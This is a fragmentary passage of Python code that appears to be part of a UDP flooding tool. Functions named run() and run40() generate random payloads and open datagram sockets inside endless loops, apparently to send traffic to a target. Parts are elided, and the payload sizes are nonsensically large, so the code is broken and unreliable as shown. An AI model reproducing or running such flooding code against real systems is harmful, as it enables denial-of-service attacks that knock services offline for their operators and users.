...
def run():
	data = random._urandom(9999999991111111110000000006553499999999911111111000000000999999999)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
...
def run40():
	data = random._urandom(535353535399999999911111111100000000065534999999999111111110000000009999999995353535399999)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
